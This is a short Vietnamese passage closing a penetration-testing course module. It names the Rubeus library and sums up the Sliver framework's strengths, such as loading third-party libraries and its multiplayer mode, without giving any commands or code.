Một thư viện `C#` tuyệt vời khác là Rubeus (chúng ta sẽ tìm hiểu về công cụ này trong mục 560.5). Những công cụ bổ sung này cho phép chúng ta mở rộng khả năng của công cụ này!

## Phần kết luận

Như chúng ta đã thấy, Sliver là một công cụ mạnh mẽ khác dành cho kiểm thử xâm nhập (và tấn công giả lập). Tính linh hoạt của công cụ cho phép chúng ta dễ dàng tải các thư viện của bên thứ ba và trích xuất thông tin (Metasploit hiện cũng có thể làm được điều này). Một trong những tính năng tuyệt vời nhất là chức năng chơi nhiều người.

